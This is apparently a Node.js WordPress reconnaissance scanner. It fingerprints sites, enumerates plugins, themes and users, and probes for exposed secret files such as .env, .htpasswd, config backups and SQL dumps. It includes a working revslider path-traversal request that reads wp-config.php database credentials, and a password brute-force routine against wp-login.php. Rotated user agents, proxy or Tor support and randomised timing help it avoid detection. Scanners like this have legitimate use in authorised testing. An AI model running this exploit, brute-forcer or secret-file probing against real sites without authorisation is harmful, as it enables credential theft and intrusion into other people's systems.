const https = require('https');
const http = require('http');
const { URL } = require('url');
const fs = require('fs');
const path = require('path');

let running = false;

// --- Configurable Options ---
const OUTPUT_FILE = path.join(__dirname, 'wp_spider_results.json');
const RATE_LIMIT_MS = 1000 + Math.floor(Math.random() * 1000); // 1-2s delay
const MAX_CONCURRENCY = 3; // For parallelization
const PROXY = null; // e.g., 'http://127.0.0.1:8080' or 'socks5://127.0.0.1:9050'
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
  'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
];

// --- Output/Reporting ---
let findings = [];
function saveFindings() {
  try {
    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(findings, null, 2));
  } catch (e) {
    send('log', `Error saving findings: ${e.message}`, 'error');
  }
}

// --- Utility: Random User-Agent ---
function getRandomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

// --- Utility: Delay ---
function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}

// --- Utility: Shuffle Array ---
function shuffle(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

// --- Proxy Support (basic, HTTP only) ---
function getRequestOptions(url, opts = {}) {
  const urlObj = new URL(url);
  let options = {
    method: opts.method || 'GET',
    timeout: opts.timeout || 10000,
    headers: {
      'User-Agent': getRandomUserAgent(),
      ...(opts.headers || {})
    }
  };
  if (PROXY && urlObj.protocol === 'http:') {
    // Basic HTTP proxy support
    const proxyUrl = new URL(PROXY);
    options.host = proxyUrl.hostname;
    options.port = proxyUrl.port;
    options.path = url;
    options.headers.Host = urlObj.hostname;
  }
  return options;
}

// --- Enhanced fetchUrl with proxy, UA, and CAPTCHA/Cloudflare detection ---
async function fetchUrl(url, opts = {}) {
  return new Promise((resolve, reject) => {
    try {
      const urlObj = new URL(url);
      const lib = urlObj.protocol === 'https:' ? https : http;
      const options = getRequestOptions(url, opts);
      const req = lib.request(url, options, (res) => {
        let body = '';
        res.on('data', (chunk) => { body += chunk.toString(); });
        res.on('end', () => {
          // CAPTCHA/Cloudflare detection
          if (/cloudflare|captcha|attention required/i.test(body)) {
            send('finding', {
              type: 'Anti-Bot Block',
              target: url,
              detail: 'Blocked by CAPTCHA/Cloudflare',
              status: 'Blocked',
              evidence: url
            });
          }
          resolve({ status: res.statusCode, headers: res.headers, body });
        });
      });
      req.on('error', reject);
      req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
      if (opts.body) req.write(opts.body);
      req.end();
    } catch (e) {
      reject(e);
    }
  });
}

// --- Save findings on every finding ---
function send(type, data, extra) {
  if (type === 'finding') {
    findings.push({ ...data, extra, timestamp: new Date().toISOString() });
    saveFindings();
  }
  if (process.send) process.send({ type, data, extra });
}

// --- Vuln DB (demo: add your own or load from file) ---
let pluginVulnDB = {};
let themeVulnDB = {};
try {
  pluginVulnDB = JSON.parse(fs.readFileSync(path.join(__dirname, 'wp_plugin_vulndb.json'), 'utf8'));
} catch {}
try {
  themeVulnDB = JSON.parse(fs.readFileSync(path.join(__dirname, 'wp_theme_vulndb.json'), 'utf8'));
} catch {}

const COMMON_PATHS = [
  '/wp-login.php', '/wp-admin/', '/wp-content/', '/readme.html',
  '/wp-config.php.bak', '/debug.log', '/.git/', '/.svn/', '/wp-content/backups/', '/wp-content/uploads/', '/wp-content/logs/', '/wp-content/old/',
  '/robots.txt', '/sitemap.xml'
];
const SENSITIVE_FILES = [
  '/wp-config.php.bak', '/debug.log', '/.git/', '/.svn/', '/wp-content/backups/', '/wp-content/uploads/', '/wp-content/logs/', '/wp-content/old/',
  '/.env', '/.htaccess', '/.htpasswd', '/db.sql', '/backup.zip', '/backup.tar.gz', '/dump.sql', '/db_backup.sql'
];
const DIRS_TO_CHECK = [
  '/wp-content/', '/wp-content/plugins/', '/wp-content/themes/', '/wp-content/uploads/', '/wp-content/backups/'
];

async function checkWordPress(baseUrl) {
  send('log', `Checking if ${baseUrl} is a WordPress site...`, 'info');
  let detected = false;
  let version = null;
  try {
    // Check common paths
    for (const path of COMMON_PATHS) {
      if (!running) return false;
      const url = baseUrl.replace(/\/$/, '') + path;
      send('log', `Probing ${url}`, 'info');
      try {
        const res = await fetchUrl(url);
        if (res.status === 200 && (
          res.body.includes('wp-content') ||
          res.body.includes('wp-includes') ||
          res.body.includes('WordPress') ||
          res.body.includes('wp-admin')
        )) {
          detected = true;
          send('finding', {
            type: 'WordPress',
            target: baseUrl,
            detail: `Detected via ${path}`,
            status: 'Detected',
            evidence: url
          });
        }
        // Version from meta
        const meta = res.body.match(/<meta name="generator" content="WordPress\s*([0-9.]+)"/i);
        if (meta) {
          version = meta[1];
          send('finding', {
            type: 'WordPress Version',
            target: baseUrl,
            detail: version,
            status: 'Detected',
            evidence: url
          });
        }
        // Version from ?ver= in assets
        const verAsset = res.body.match(/(\?|&)ver=([0-9.]+)/);
        if (verAsset) {
          version = verAsset[2];
          send('finding', {
            type: 'WordPress Version',
            target: baseUrl,
            detail: version,
            status: 'Detected',
            evidence: url
          });
        }
      } catch {}
    }
    if (!detected) {
      send('log', `No WordPress detected on ${baseUrl}`, 'warning');
      send('finding', {
        type: 'WordPress',
        target: baseUrl,
        detail: 'Not detected',
        status: 'Not Found',
        evidence: baseUrl
      });
      return false;
    }
    send('log', `WordPress detected on ${baseUrl}${version ? ' (v' + version + ')' : ''}`, 'info');
    return true;
  } catch (e) {
    send('log', `Error checking ${baseUrl}: ${e.message}`, 'error');
    return false;
  }
}

async function enumeratePlugins(baseUrl) {
  send('log', 'Enumerating plugins...', 'info');
  const url = baseUrl.replace(/\/$/, '') + '/wp-content/plugins/';
  try {
    const res = await fetchUrl(url);
    if (res.status === 200 && res.body.match(/href="([^"]+)\/"/g)) {
      const plugins = [...new Set((res.body.match(/href="([^"]+)\/"/g) || []).map(m => m.match(/href="([^"]+)\//)[1]))];
      for (const plugin of plugins) {
        if (!running) break;
        let version = null;
        // Try to get version from readme.txt or plugin file
        try {
          const readmeUrl = url + plugin + '/readme.txt';
          const readmeRes = await fetchUrl(readmeUrl);
          const verMatch = readmeRes.body.match(/Stable tag:\s*([0-9.]+)/i);
          if (verMatch) version = verMatch[1];
        } catch {}
        send('finding', {
          type: 'Plugin',
          target: baseUrl,
          detail: plugin + (version ? ` (v${version})` : ''),
          status: 'Found',
          evidence: url + plugin + '/'
        });
        // Vuln DB check
        if (version && pluginVulnDB[plugin] && pluginVulnDB[plugin][version]) {
          send('finding', {
            type: 'Plugin Vulnerability',
            target: baseUrl,
            detail: `${plugin} v${version}: ${pluginVulnDB[plugin][version].title}`,
            status: 'Vulnerable',
            evidence: pluginVulnDB[plugin][version].url || ''
          });
        }
        // --- Active Vulnerability Checks: Example for LFI ---
        // Try to check for LFI in a common vulnerable plugin (example: revslider)
        if (plugin === 'revslider') {
          try {
            const lfiUrl = baseUrl.replace(/\/$/, '') + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
            const lfiRes = await fetchUrl(lfiUrl);
            if (lfiRes.status === 200 && /DB_NAME|DB_USER|DB_PASSWORD/.test(lfiRes.body)) {
              send('finding', {
                type: 'Active LFI Exploit',
                target: baseUrl,
                detail: 'revslider LFI vulnerability exploited',
                status: 'Exploitable',
                evidence: lfiUrl
              });
            }
          } catch {}
        }
        // --- End Active Vuln Check Example ---
      }
    }
  } catch {}
}

async function enumerateThemes(baseUrl) {
  send('log', 'Enumerating themes...', 'info');
  const url = baseUrl.replace(/\/$/, '') + '/wp-content/themes/';
  try {
    const res = await fetchUrl(url);
    if (res.status === 200 && res.body.match(/href="([^"]+)\/"/g)) {
      const themes = [...new Set((res.body.match(/href="([^"]+)\/"/g) || []).map(m => m.match(/href="([^"]+)\//)[1]))];
      for (const theme of themes) {
        if (!running) break;
        let version = null;
        // Try to get version from style.css
        try {
          const styleUrl = url + theme + '/style.css';
          const styleRes = await fetchUrl(styleUrl);
          const verMatch = styleRes.body.match(/Version:\s*([0-9.]+)/i);
          if (verMatch) version = verMatch[1];
        } catch {}
        send('finding', {
          type: 'Theme',
          target: baseUrl,
          detail: theme + (version ? ` (v${version})` : ''),
          status: 'Found',
          evidence: url + theme + '/'
        });
        // Vuln DB check
        if (version && themeVulnDB[theme] && themeVulnDB[theme][version]) {
          send('finding', {
            type: 'Theme Vulnerability',
            target: baseUrl,
            detail: `${theme} v${version}: ${themeVulnDB[theme][version].title}`,
            status: 'Vulnerable',
            evidence: themeVulnDB[theme][version].url || ''
          });
        }
      }
    }
  } catch {}
}

async function checkSensitivePaths(baseUrl) {
  send('log', 'Checking for sensitive files and backups...', 'info');
  for (const path of SENSITIVE_FILES) {
    if (!running) break;
    const url = baseUrl.replace(/\/$/, '') + path;
    try {
      const res = await fetchUrl(url);
      if (res.status === 200 && res.body && res.body.length > 0) {
        send('finding', {
          type: 'Sensitive File',
          target: baseUrl,
          detail: path,
          status: 'Accessible',
          evidence: url
        });
      }
    } catch {}
  }
}

async function checkDirectoryIndexing(baseUrl) {
  send('log', 'Checking for directory indexing...', 'info');
  for (const dir of DIRS_TO_CHECK) {
    if (!running) break;
    const url = baseUrl.replace(/\/$/, '') + dir;
    try {
      const res = await fetchUrl(url);
      if (res.status === 200 && /Index of/i.test(res.body)) {
        send('finding', {
          type: 'Directory Indexing',
          target: baseUrl,
          detail: dir,
          status: 'Enabled',
          evidence: url
        });
      }
    } catch {}
  }
}

async function checkXmlRpc(baseUrl) {
  send('log', 'Checking /xmlrpc.php endpoint...', 'info');
  const url = baseUrl.replace(/\/$/, '') + '/xmlrpc.php';
  try {
    // Probe with POST
    const res = await fetchUrl(url, { method: 'POST', body: '' });
    if (res.status === 405 || res.status === 403 || res.status === 200) {
      send('finding', {
        type: 'XML-RPC',
        target: baseUrl,
        detail: `xmlrpc.php status ${res.status}`,
        status: 'Exposed',
        evidence: url
      });
      // Try system.listMethods
      const xml = `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`;
      const res2 = await fetchUrl(url, { method: 'POST', body: xml });
      if (res2.body && res2.body.includes('system.listMethods')) {
        send('finding', {
          type: 'XML-RPC',
          target: baseUrl,
          detail: 'system.listMethods enabled',
          status: 'Exposed',
          evidence: url
        });
      }
    }
  } catch {}
}

async function checkRestApi(baseUrl) {
  send('log', 'Checking /wp-json/ REST API...', 'info');
  const url = baseUrl.replace(/\/$/, '') + '/wp-json/';
  try {
    const res = await fetchUrl(url);
    if (res.status === 200 && res.body && res.body.includes('routes')) {
      send('finding', {
        type: 'REST API',
        target: baseUrl,
        detail: 'wp-json/ exposed',
        status: 'Exposed',
        evidence: url
      });
      // Try to enumerate routes
      const routes = res.body.match(/"\/[a-zA-Z0-9_\-\/]+"/g) || [];
      for (const route of routes) {
        send('log', `REST route: ${route.replace(/"/g, '')}`, 'info');
      }
      // Try to fetch users
      const usersUrl = url + 'wp/v2/users';
      const usersRes = await fetchUrl(usersUrl);
      if (usersRes.status === 200 && usersRes.body && usersRes.body.includes('name')) {
        send('finding', {
          type: 'REST API',
          target: baseUrl,
          detail: 'User enumeration via REST API',
          status: 'Exposed',
          evidence: usersUrl
        });
      }
    }
  } catch {}
}

async function checkRobotsAndSitemap(baseUrl) {
  for (const path of ['/robots.txt', '/sitemap.xml']) {
    if (!running) break;
    const url = baseUrl.replace(/\/$/, '') + path;
    try {
      const res = await fetchUrl(url);
      if (res.status === 200 && res.body && res.body.length > 0) {
        send('finding', {
          type: path === '/robots.txt' ? 'Robots.txt' : 'Sitemap.xml',
          target: baseUrl,
          detail: 'Accessible',
          status: 'Found',
          evidence: url
        });
      }
    } catch {}
  }
}

async function passiveUserEnum(baseUrl) {
  send('log', 'Passive user enumeration...', 'info');
  // /author/1,2,3
  for (let i = 1; i <= 5 && running; i++) {
    const url = baseUrl.replace(/\/$/, '') + '/?author=' + i;
    try {
      const res = await fetchUrl(url);
      const match = res.body && res.body.match(/author\/([a-zA-Z0-9_-]+)/);
      if (match) {
        send('finding', {
          type: 'User',
          target: baseUrl,
          detail: match[1],
          status: 'Found',
          evidence: url
        });
      }
    } catch {}
  }
  // RSS feed
  try {
    const rssUrl = baseUrl.replace(/\/$/, '') + '/feed/';
    const res = await fetchUrl(rssUrl);
    const matches = res.body && res.body.match(/<dc:creator><!\[CDATA\[([^\]]+)\]\]><\/dc:creator>/g);
    if (matches) {
      for (const m of matches) {
        const user = m.match(/CDATA\[([^\]]+)\]/)[1];
        send('finding', {
          type: 'User',
          target: baseUrl,
          detail: user,
          status: 'Found',
          evidence: rssUrl
        });
      }
    }
  } catch {}
}

// --- HTML/JS Parsing for Plugins/Themes ---
async function parseHtmlForPluginsThemes(baseUrl) {
  send('log', 'Parsing HTML for plugin/theme references...', 'info');
  const url = baseUrl.replace(/\/$/, '');
  try {
    const res = await fetchUrl(url);
    if (res.status === 200 && res.body) {
      // Find /wp-content/plugins/PLUGIN/ and /wp-content/themes/THEME/
      const pluginMatches = [...new Set((res.body.match(/\/wp-content\/plugins\/([a-zA-Z0-9_-]+)\//g) || []).map(m => m.match(/plugins\/([a-zA-Z0-9_-]+)\//)[1]))];
      const themeMatches = [...new Set((res.body.match(/\/wp-content\/themes\/([a-zA-Z0-9_-]+)\//g) || []).map(m => m.match(/themes\/([a-zA-Z0-9_-]+)\//)[1]))];
      for (const plugin of pluginMatches) {
        send('finding', {
          type: 'Plugin (HTML Ref)',
          target: baseUrl,
          detail: plugin,
          status: 'Referenced',
          evidence: url
        });
      }
      for (const theme of themeMatches) {
        send('finding', {
          type: 'Theme (HTML Ref)',
          target: baseUrl,
          detail: theme,
          status: 'Referenced',
          evidence: url
        });
      }
      return { plugins: pluginMatches, themes: themeMatches };
    }
  } catch {}
  return { plugins: [], themes: [] };
}

// --- Probe Known Plugin/Theme Files ---
async function probeKnownPluginThemeFiles(baseUrl, plugins, themes) {
  send('log', 'Probing known plugin/theme files for version info...', 'info');
  const url = baseUrl.replace(/\/$/, '');
  for (const plugin of plugins) {
    if (!running) break;
    try {
      const readmeUrl = url + `/wp-content/plugins/${plugin}/readme.txt`;
      const res = await fetchUrl(readmeUrl);
      const verMatch = res.body && res.body.match(/Stable tag:\s*([0-9.]+)/i);
      if (verMatch) {
        send('finding', {
          type: 'Plugin Version (Known File)',
          target: baseUrl,
          detail: `${plugin} v${verMatch[1]}`,
          status: 'Found',
          evidence: readmeUrl
        });
      }
    } catch {}
  }
  for (const theme of themes) {
    if (!running) break;
    try {
      const styleUrl = url + `/wp-content/themes/${theme}/style.css`;
      const res = await fetchUrl(styleUrl);
      const verMatch = res.body && res.body.match(/Version:\s*([0-9.]+)/i);
      if (verMatch) {
        send('finding', {
          type: 'Theme Version (Known File)',
          target: baseUrl,
          detail: `${theme} v${verMatch[1]}`,
          status: 'Found',
          evidence: styleUrl
        });
      }
    } catch {}
  }
}

// --- Vuln DB Auto-Update (WPScan) ---
async function updateVulnDB() {
  // NOTE: You need a WPScan API key for full access. See https://wpscan.com/api
  const apiKey = process.env.WPSCAN_API_KEY || '';
  if (!apiKey) {
    send('log', 'WPScan API key not set. Skipping vuln DB update.', 'warning');
    return;
  }
  const pluginUrl = `https://wpscan.com/api/v3/plugins.json?api_token=${apiKey}`;
  const themeUrl = `https://wpscan.com/api/v3/themes.json?api_token=${apiKey}`;
  try {
    const pluginRes = await fetchUrl(pluginUrl);
    if (pluginRes.status === 200) {
      fs.writeFileSync(path.join(__dirname, 'wp_plugin_vulndb.json'), pluginRes.body);
      send('log', 'Updated plugin vuln DB from WPScan.', 'info');
    }
    const themeRes = await fetchUrl(themeUrl);
    if (themeRes.status === 200) {
      fs.writeFileSync(path.join(__dirname, 'wp_theme_vulndb.json'), themeRes.body);
      send('log', 'Updated theme vuln DB from WPScan.', 'info');
    }
  } catch (e) {
    send('log', `Error updating vuln DB: ${e.message}`, 'error');
  }
}

// --- Brute-Force/Weak Credential Checks (Optional, Caution!) ---
async function bruteForceLogin(baseUrl, usernames, passwords) {
  send('log', 'Starting brute-force login attempts (use only with permission!)', 'warning');
  const loginUrl = baseUrl.replace(/\/$/, '') + '/wp-login.php';
  for (const user of usernames) {
    for (const pass of passwords) {
      if (!running) return;
      try {
        const body = `log=${encodeURIComponent(user)}&pwd=${encodeURIComponent(pass)}&wp-submit=Log+In&testcookie=1`;
        const res = await fetchUrl(loginUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'wordpress_test_cookie=WP+Cookie+check'
          },
          body
        });
        if (res.status === 302 && res.headers['location'] && !/login|wp-login/i.test(res.headers['location'])) {
          send('finding', {
            type: 'Weak Credentials',
            target: baseUrl,
            detail: `Valid credentials found: ${user}:${pass}`,
            status: 'Exploitable',
            evidence: loginUrl
          });
          return; // Stop after first success
        }
      } catch {}
      await delay(500 + Math.floor(Math.random() * 500)); // Slow down
    }
  }
}

async function runSpider(opts) {
  running = true;
  let progress = 0;
  for (const url of shuffle(opts.urls)) { // Randomize order
    if (!running) break;
    send('progress', ++progress);
    send('log', `--- Recon on ${url} ---`, 'action');
    const isWP = await checkWordPress(url);
    if (!isWP) continue;
    // HTML/JS parsing for plugins/themes
    const { plugins: htmlPlugins, themes: htmlThemes } = await parseHtmlForPluginsThemes(url);
    await probeKnownPluginThemeFiles(url, htmlPlugins, htmlThemes);
    if (opts.enumPlugins && running) await enumeratePlugins(url);
    if (opts.enumThemes && running) await enumerateThemes(url);
    if (running) await checkSensitivePaths(url);
    if (running) await checkDirectoryIndexing(url);
    if (running) await checkXmlRpc(url);
    if (running) await checkRestApi(url);
    if (running) await checkRobotsAndSitemap(url);
    if (opts.enumUsers && running) await passiveUserEnum(url);
    // if (opts.bruteForce && running) await bruteForceLogin(url, opts.usernames, opts.passwords);
    send('log', `Finished scanning ${url}`, 'info');
    await delay(RATE_LIMIT_MS); // Rate limiting
  }
  send('status', 'Idle');
}

process.on('message', async (msg) => {
  if (msg && msg.type === 'start') {
    running = true;
    send('status', 'Running');
    await updateVulnDB(); // Auto-update vuln DB before scan
    await runSpider(msg.data);
    send('status', 'Idle');
  } else if (msg && msg.type === 'stop') {
    running = false;
    send('log', 'Spider stopped by user.', 'warning');
    send('status', 'Stopped');
    process.exit(0);
  }
});

// Add your own recon and vuln identification features here as needed.
